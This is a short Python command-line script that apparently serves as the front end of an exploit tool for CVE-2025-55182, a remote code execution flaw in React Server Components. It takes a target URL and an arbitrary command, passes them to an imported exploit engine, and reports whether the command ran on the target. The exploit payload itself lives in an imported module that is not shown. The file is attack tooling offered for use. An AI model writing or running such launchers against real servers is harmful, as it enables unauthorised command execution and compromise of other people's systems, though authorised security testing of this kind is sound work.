import argparse
import sys
from cybertechmind_cve_2025_55182.core import (
    ExploitConfig,
    ExploitEngine,
    BannerDisplay
)

def main():
    BannerDisplay.show_header()

    parser = argparse.ArgumentParser(
        description="CVE-2025-55182 React Server Components RCE"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")

    args = parser.parse_args()

    config = ExploitConfig()
    config.target_url = config.normalize_url(args.target)
    config.payload_cmd = args.command

    BannerDisplay.show_config(config.target_url, config.payload_cmd)

    engine = ExploitEngine(config)
    success, status, data = engine.execute()

    if success:
        BannerDisplay.show_success(data)
        sys.exit(0)

    BannerDisplay.show_failure(status, data)
    sys.exit(1)

if __name__ == "__main__":
    main()
